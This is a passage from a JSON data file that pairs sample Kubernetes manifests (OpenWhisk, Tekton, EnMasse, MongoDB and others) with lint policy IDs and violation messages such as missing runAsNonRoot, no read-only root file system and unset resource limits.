\\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-for-kafka\" has memory limit 0"
  },
  {
    "id": "10558",
    "manifest_path": "data/manifests/the_stack_sample/sample_4078.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    flux.weave.works/automated: 'true'\n  name: core-app\n  namespace: k8s-demo\nspec:\n  selector:\n    matchLabels:\n      app: core-app\n  template:\n    metadata:\n      labels:\n        app: core-app\n    spec:\n      containers:\n      - name: core-app\n        image: core-app:demo\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3001\n          name: http\n        volumeMounts:\n        - name: secrets\n          mountPath: /etc/secrets\n        env:\n        - name: REDIS_HOST\n          value: redis-primary\n        - name: REDIS_PORT\n          value: '6379'\n        - name: POSTGRES_HOST\n          value: postgres-primary\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: SECRET1_TEST\n          valueFrom:\n            secretKeyRef:\n              name: core-app\n              key: val1test\n        - name: CONFIGMAP_TEST\n          valueFrom:\n            configMapKeyRef:\n              name: core-app\n              key: test.config.key1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 300Mi\n          requests:\n            cpu: 200m\n            memory: 300Mi\n      volumes:\n      - name: secrets\n        secret:\n          secretName: core-app\n          items:\n          - key: val2test\n            path: secret_file\n            mode: 511\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"core-app\" does not have a read-only root file system"
  },
  {
    "id": "10559",
    "manifest_path": "data/manifests/the_stack_sample/sample_4078.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    flux.weave.works/automated: 'true'\n  name: core-app\n  namespace: k8s-demo\nspec:\n  selector:\n    matchLabels:\n      app: core-app\n  template:\n    metadata:\n      labels:\n        app: core-app\n    spec:\n      containers:\n      - name: core-app\n        image: core-app:demo\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3001\n          name: http\n        volumeMounts:\n        - name: secrets\n          mountPath: /etc/secrets\n        env:\n        - name: REDIS_HOST\n          value: redis-primary\n        - name: REDIS_PORT\n          value: '6379'\n        - name: POSTGRES_HOST\n          value: postgres-primary\n        - name: POSTGRES_PORT\n          value: '5432'\n        - name: SECRET1_TEST\n          valueFrom:\n            secretKeyRef:\n              name: core-app\n              key: val1test\n        - name: CONFIGMAP_TEST\n          valueFrom:\n            configMapKeyRef:\n              name: core-app\n              key: test.config.key1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 300Mi\n          requests:\n            cpu: 200m\n            memory: 300Mi\n      volumes:\n      - name: secrets\n        secret:\n          secretName: core-app\n          items:\n          - key: val2test\n            path: secret_file\n            mode: 511\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"core-app\" is not set to runAsNonRoot"
  },
  {
    "id": "10560",
    "manifest_path": "data/manifests/the_stack_sample/sample_4080.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-release-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: CLUSTER_RESOURCE\n            value: robocat-tekton-deployer\n          - name: TEKTON_PROJECT\n            value: dashboard\n          - name: TEKTON_VERSION\n            value: latest\n          - name: TEKTON_CLUSTER\n            value: robocat\n          - name: RELEASE_FILE\n            value: tekton-dashboard-release-readonly.yaml\n          - name: RELEASE_BUCKET\n            value: gs://tekton-releases-nightly\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"trigger\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10561",
    "manifest_path": "data/manifests/the_stack_sample/sample_4080.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-release-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: CLUSTER_RESOURCE\n            value: robocat-tekton-deployer\n          - name: TEKTON_PROJECT\n            value: dashboard\n          - name: TEKTON_VERSION\n            value: latest\n          - name: TEKTON_CLUSTER\n            value: robocat\n          - name: RELEASE_FILE\n            value: tekton-dashboard-release-readonly.yaml\n          - name: RELEASE_BUCKET\n            value: gs://tekton-releases-nightly\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"trigger\" does not have a read-only root file system"
  },
  {
    "id": "10562",
    "manifest_path": "data/manifests/the_stack_sample/sample_4080.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-release-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: CLUSTER_RESOURCE\n            value: robocat-tekton-deployer\n          - name: TEKTON_PROJECT\n            value: dashboard\n          - name: TEKTON_VERSION\n            value: latest\n          - name: TEKTON_CLUSTER\n            value: robocat\n          - name: RELEASE_FILE\n            value: tekton-dashboard-release-readonly.yaml\n          - name: RELEASE_BUCKET\n            value: gs://tekton-releases-nightly\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"trigger\" is not set to runAsNonRoot"
  },
  {
    "id": "10563",
    "manifest_path": "data/manifests/the_stack_sample/sample_4080.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-release-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: CLUSTER_RESOURCE\n            value: robocat-tekton-deployer\n          - name: TEKTON_PROJECT\n            value: dashboard\n          - name: TEKTON_VERSION\n            value: latest\n          - name: TEKTON_CLUSTER\n            value: robocat\n          - name: RELEASE_FILE\n            value: tekton-dashboard-release-readonly.yaml\n          - name: RELEASE_BUCKET\n            value: gs://tekton-releases-nightly\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"trigger\" has cpu request 0"
  },
  {
    "id": "10564",
    "manifest_path": "data/manifests/the_stack_sample/sample_4080.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tekton-release-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: CLUSTER_RESOURCE\n            value: robocat-tekton-deployer\n          - name: TEKTON_PROJECT\n            value: dashboard\n          - name: TEKTON_VERSION\n            value: latest\n          - name: TEKTON_CLUSTER\n            value: robocat\n          - name: RELEASE_FILE\n            value: tekton-dashboard-release-readonly.yaml\n          - name: RELEASE_BUCKET\n            value: gs://tekton-releases-nightly\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"trigger\" has memory limit 0"
  },
  {
    "id": "10565",
    "manifest_path": "data/manifests/the_stack_sample/sample_4082.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: strange-brew-svc\nspec:\n  type: LoadBalancer\n  selector:\n    app: strange-brew\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:strange-brew])"
  },
  {
    "id": "10566",
    "manifest_path": "data/manifests/the_stack_sample/sample_4083.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: different-app-db\n  labels:\n    type: db\n    service: different-app\n    vendor: MongoLabs\nspec:\n  selector:\n    matchLabels:\n      type: db\n      service: different-app\n  template:\n    metadata:\n      labels:\n        type: db\n        service: different-app\n        vendor: MongoLabs\n    spec:\n      containers:\n      - name: db\n        image: mongo:3.3\n        ports:\n        - containerPort: 28017\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"db\" does not have a read-only root file system"
  },
  {
    "id": "10567",
    "manifest_path": "data/manifests/the_stack_sample/sample_4083.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: different-app-db\n  labels:\n    type: db\n    service: different-app\n    vendor: MongoLabs\nspec:\n  selector:\n    matchLabels:\n      type: db\n      service: different-app\n  template:\n    metadata:\n      labels:\n        type: db\n        service: different-app\n        vendor: MongoLabs\n    spec:\n      containers:\n      - name: db\n        image: mongo:3.3\n        ports:\n        - containerPort: 28017\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"db\" is not set to runAsNonRoot"
  },
  {
    "id": "10568",
    "manifest_path": "data/manifests/the_stack_sample/sample_4083.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: different-app-db\n  labels:\n    type: db\n    service: different-app\n    vendor: MongoLabs\nspec:\n  selector:\n    matchLabels:\n      type: db\n      service: different-app\n  template:\n    metadata:\n      labels:\n        type: db\n        service: different-app\n        vendor: MongoLabs\n    spec:\n      containers:\n      - name: db\n        image: mongo:3.3\n        ports:\n        - containerPort: 28017\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"db\" has cpu request 0"
  },
  {
    "id": "10569",
    "manifest_path": "data/manifests/the_stack_sample/sample_4083.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: different-app-db\n  labels:\n    type: db\n    service: different-app\n    vendor: MongoLabs\nspec:\n  selector:\n    matchLabels:\n      type: db\n      service: different-app\n  template:\n    metadata:\n      labels:\n        type: db\n        service: different-app\n        vendor: MongoLabs\n    spec:\n      containers:\n      - name: db\n        image: mongo:3.3\n        ports:\n        - containerPort: 28017\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"db\" has memory limit 0"
  },
  {
    "id": "10570",
    "manifest_path": "data/manifests/the_stack_sample/sample_4084.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    io.kompose.service: trillian-log-service\n  name: trillian-log-service\n  annotations:\n    cloud.google.com/load-balancer-type: Internal\nspec:\n  type: LoadBalancer\n  ports:\n  - name: grpclb\n    port: 8090\n    targetPort: 8090\n  - name: metrics\n    port: 8091\n    targetPort: 8091\n  selector:\n    io.kompose.service: trillian-log\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[io.kompose.service:trillian-log])"
  },
  {
    "id": "10571",
    "manifest_path": "data/manifests/the_stack_sample/sample_4085.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: enmasse-operator\n  labels:\n    app: enmasse\n    name: enmasse-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: enmasse\n      name: enmasse-operator\n  template:\n    metadata:\n      labels:\n        app: enmasse\n        name: enmasse-operator\n      annotations:\n        enmasse.io/version: ${VERSION}\n        enmasse.io/revision: ${REVISION}\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            preference:\n              matchExpressions:\n              - key: node-role.enmasse.io/operator-infra\n                operator: In\n                values:\n                - 'true'\n      serviceAccountName: enmasse-operator\n      containers:\n      - name: controller\n        image: ${CONTROLLER_MANAGER_IMAGE}\n        imagePullPolicy: ${IMAGE_PULL_POLICY}\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: REVISION\n          value: ${REVISION}\n        - name: VERSION\n          value: ${VERSION}\n        - name: CONTROLLER_ENABLE_MESSAGING_INFRASTRUCTURE\n          value: 'false'\n        - name: OPERATOR_NAME\n          value: enmasse-operator\n        - name: IMAGE_PULL_POLICY\n          value: ${IMAGE_PULL_POLICY}\n        - name: CONTROLLER_DISABLE_ALL\n          value: 'true'\n        - name: CONTROLLER_ENABLE_UPGRADER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_AUTHENTICATION_SERVICE\n          value: 'true'\n        - name: CONTROLLER_ENABLE_ADDRESS_SPACE_CONTROLLER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_MESSAGING_USER\n          value: 'true'\n        - name: RELATED_IMAGE_ADDRESS_SPACE_CONTROLLER\n          value: ${ADDRESS_SPACE_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_CONTROLLER_MANAGER\n          value: ${CONTROLLER_MANAGER_IMAGE}\n        - name: RELATED_IMAGE_ROUTER\n          value: ${ROUTER_IMAGE}\n        - name: RELATED_IMAGE_STANDARD_CONTROLLER\n          value: ${STANDARD_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_AGENT\n          value: ${AGENT_IMAGE}\n        - name: RELATED_IMAGE_BROKER\n          value: ${BROKER_IMAGE}\n        - name: RELATED_IMAGE_BROKER_PLUGIN\n          value: ${BROKER_PLUGIN_IMAGE}\n        - name: RELATED_IMAGE_TOPIC_FORWARDER\n          value: ${TOPIC_FORWARDER_IMAGE}\n        - name: RELATED_IMAGE_NONE_AUTHSERVICE\n          value: ${NONE_AUTHSERVICE_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK\n          value: ${KEYCLOAK_IMAGE}\n        - name: RELATED_IMAGE_KEYCLOAK_PLUGIN\n          value: ${KEYCLOAK_PLUGIN_IMAGE}\n        - name: CONTROLLER_ENABLE_CONSOLE_SERVICE\n          value: 'true'\n        - name: RELATED_IMAGE_CONSOLE_INIT\n          value: ${CONSOLE_INIT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_SERVER\n          value: ${CONSOLE_SERVER_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT\n          value: ${CONSOLE_PROXY_OPENSHIFT_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_OPENSHIFT3\n          value: ${CONSOLE_PROXY_OPENSHIFT3_IMAGE}\n        - name: RELATED_IMAGE_CONSOLE_PROXY_KUBERNETES\n          value: ${CONSOLE_PROXY_KUBERNETES_IMAGE}\n        - name: CONSOLE_LINK_SECTION_NAME\n          value: ${CONSOLE_LINK_SECTION_NAME}\n        - name: CONSOLE_LINK_NAME\n          value: ${CONSOLE_LINK_NAME}\n        - name: CONSOLE_LINK_IMAGE_URL\n          value: ${CONSOLE_LINK_IMAGE_URL}\n        - name: ENABLE_MONITORING\n          value: 'true'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"controller\" is using an invalid container image, \"${CONTROLLER_MANAGER_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10572",
    "manifest_path": "data/manifests/the_stack_sample/sample_4085.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: enmasse-operator\n  labels:\n    app: enmasse\n    name: enmasse-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: enmasse\n      name: enmasse-operator\n  template:\n    metadata:\n      labels:\n        app: enmasse\n        name: enmasse-operator\n      annotations:\n        enmasse.io/version: ${VERSION}\n        enmasse.io/revision: ${REVISION}\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            preference:\n              matchExpressions:\n              - key: node-role.enmasse.io/operator-infra\n                operator: In\n                values:\n                - 'true'\n      serviceAccountName: enmasse-operator\n      containers:\n      - name: controller\n        image: ${CONTROLLER_MANAGER_IMAGE}\n        imagePullPolicy: ${IMAGE_PULL_POLICY}\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: REVISION\n          value: ${REVISION}\n        - name: VERSION\n          value: ${VERSION}\n        - name: CONTROLLER_ENABLE_MESSAGING_INFRASTRUCTURE\n          value: 'false'\n        - name: OPERATOR_NAME\n          value: enmasse-operator\n        - name: IMAGE_PULL_POLICY\n          value: ${IMAGE_PULL_POLICY}\n        - name: CONTROLLER_DISABLE_ALL\n          value: 'true'\n        - name: CONTROLLER_ENABLE_UPGRADER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_AUTHENTICATION_SERVICE\n          value: 'true'\n        - name: CONTROLLER_ENABLE_ADDRESS_SPACE_CONTROLLER\n          value: 'true'\n        - name: CONTROLLER_ENABLE_MESSAGING_USER\n          value: 'true'\n        - name: RELATED_IMAGE_ADDRESS_SPACE_CONTROLLER\n          value: ${ADDRESS_SPACE_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_CONTROLLER_MANAGER\n          value: ${CONTROLLER_MANAGER_IMAGE}\n        - name: RELATED_IMAGE_ROUTER\n          value: ${ROUTER_IMAGE}\n        - name: RELATED_IMAGE_STANDARD_CONTROLLER\n          value: ${STANDARD_CONTROLLER_IMAGE}\n        - name: RELATED_IMAGE_AGENT\n          